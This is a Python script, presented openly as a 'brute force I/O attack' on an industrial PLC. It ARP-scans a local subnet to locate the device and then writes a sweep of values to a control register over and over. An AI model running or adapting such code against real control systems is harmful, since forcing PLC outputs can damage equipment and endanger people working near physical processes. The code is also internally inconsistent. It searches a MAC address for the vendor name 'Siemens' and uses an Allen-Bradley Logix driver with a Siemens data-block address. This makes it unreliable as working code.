import time
from pycomm3 import LogixDriver
from scapy.all import ARP, Ether, srp

# Function to discover the IP address of the PLC
def discover_plc_ip():
    # Define the target IP range to scan
    target_ip = "192.168.1.0/24"
    
    # Create an ARP request packet
    arp = ARP(pdst=target_ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    
    # Send the packet and capture the response
    result = srp(packet, timeout=3, verbose=0)[0]
    
    # Parse the response to find the PLC
    for sent, received in result:
        if "Siemens" in received.hwsrc:  # Assuming the PLC has a known MAC address prefix
            return received.psrc
    
    return None

# Function to perform Brute Force I/O attack
def brute_force_io(plc_ip, io_point, min_value, max_value, step, delay):
    try:
        # Connect to the PLC
        with LogixDriver(plc_ip) as plc:
            print(f"Connected to PLC at {plc_ip}")
            
            # Perform the brute force attack
            for value in range(min_value, max_value + 1, step):
                print(f"Setting {io_point} to {value}")
                plc.write((io_point, value))
                time.sleep(delay)
    
    except Exception as e:
        print(f"Error: {e}")

# Main function
def main():
    # Discover the PLC IP address
    plc_ip = discover_plc_ip()
    if not plc_ip:
        print("PLC not found. Exiting.")
        return
    
    # Define the I/O point and parameters for the brute force attack
    io_point = "DB1.DBW0"  # Example I/O point
    min_value = 0
    max_value = 100
    step = 1
    delay = 0.5  # Delay between each change in seconds
    
    # Perform the brute force attack
    brute_force_io(plc_ip, io_point, min_value, max_value, step, delay)

if __name__ == "__main__":
    main()